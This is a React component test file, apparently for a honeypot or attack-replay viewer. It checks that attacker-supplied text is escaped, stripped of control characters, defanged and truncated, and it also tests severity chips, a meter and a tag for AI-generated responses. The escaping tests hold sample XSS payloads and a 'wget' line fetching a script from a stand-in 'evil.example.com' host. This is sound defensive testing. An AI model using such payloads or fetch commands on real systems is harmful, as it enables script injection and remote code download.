import { render, screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { isStitched } from "../lib/replay";
import { AttackerText } from "./AttackerText";
import { SeverityChip } from "./SeverityChip";
import { StitchedTag } from "./StitchedTag";
import { VoltageMeter } from "./VoltageMeter";

describe("AttackerText", () => {
  it("renders HTML-like input as escaped text with no injected elements", () => {
    const input = '<script>alert(1)</script><img src=x onerror=alert(1)><b>hi</b>';
    const { container } = render(<AttackerText value={input} />);
    const span = container.querySelector(".attacker-text") as HTMLElement;
    expect(span.textContent).toBe(input);
    expect(container.querySelector("script, img, b, a")).toBeNull();
    expect(container.querySelectorAll("*")).toHaveLength(1);
  });

  it("strips control characters and ANSI sequences", () => {
    const { container } = render(<AttackerText value={"a\x1b[31mred\x1b[0m\x00b\x07c"} />);
    expect(container.textContent).toBe("aredbc");
  });

  it("defangs URLs and never renders a link", () => {
    const { container } = render(
      <AttackerText value="wget http://evil.example.com/x.sh https://a.b.io" />,
    );
    const text = container.textContent ?? "";
    expect(text).toContain("hxxp://evil[.]example[.]com/x.sh");
    expect(text).toContain("hxxps://a[.]b[.]io");
    expect(text).not.toMatch(/https?:\/\//);
    expect(container.querySelector("a")).toBeNull();
    expect(container.querySelector("[href]")).toBeNull();
  });

  it("shows the truncation marker only above 4096 characters", () => {
    const over = render(<AttackerText value={"x".repeat(4097)} />);
    expect(over.container.textContent).toContain("(truncated)");
    over.unmount();
    const at = render(<AttackerText value={"x".repeat(4096)} />);
    expect(at.container.textContent).not.toContain("(truncated)");
  });
});

describe("SeverityChip", () => {
  it.each([
    ["Class_5", "Class 5", "solid", "chip--class-5"],
    ["Class_3", "Class 3", "outline", "chip--class-3"],
    ["Class_1", "Class 1", "outline-muted", "chip--class-1"],
  ])("renders %s as %s", (value, label, variant, cls) => {
    render(<SeverityChip severity={value} />);
    const chip = screen.getByText(label);
    expect(chip.getAttribute("data-variant")).toBe(variant);
    expect(chip.classList.contains(cls)).toBe(true);
  });

  it("falls back to the unknown variant for unexpected values", () => {
    render(<SeverityChip severity="bogus" />);
    expect(screen.getByText("bogus").getAttribute("data-variant")).toBe("unknown");
  });
});

describe("VoltageMeter", () => {
  const lit = (c: HTMLElement) => c.querySelectorAll('[data-lit="true"]').length;
  const total = (c: HTMLElement) => c.querySelectorAll(".voltage-segment").length;

  it.each([
    [0, 0],
    [4, 4],
    [10, 10],
    [15, 10],
    [-3, 0],
  ])("level %i lights %i of 10 segments", (level, expected) => {
    const { container } = render(<VoltageMeter level={level} />);
    expect(total(container)).toBe(10);
    expect(lit(container)).toBe(expected);
    expect(screen.getByRole("meter").getAttribute("aria-valuenow")).toBe(String(expected));
    expect(container.textContent).toContain(`${expected}/10`);
  });
});

describe("StitchedTag", () => {
  it("explains that the AI invented the response", () => {
    render(<StitchedTag />);
    expect(screen.getByText("Stitched")).toBeTruthy();
    expect(screen.getByText(/the AI invented this response/)).toBeTruthy();
  });

  it("is shown only for llm-generated events", () => {
    const events = [
      { id: 1, generated_by: "llm" },
      { id: 2, generated_by: "scripted" },
    ];
    const { container } = render(
      <ul>
        {events.map((e) => (
          <li key={e.id}>{isStitched(e) ? <StitchedTag /> : null}</li>
        ))}
      </ul>,
    );
    const items = container.querySelectorAll("li");
    expect(items[0].querySelector(".tag-stitched")).not.toBeNull();
    expect(items[1].querySelector(".tag-stitched")).toBeNull();
  });
});
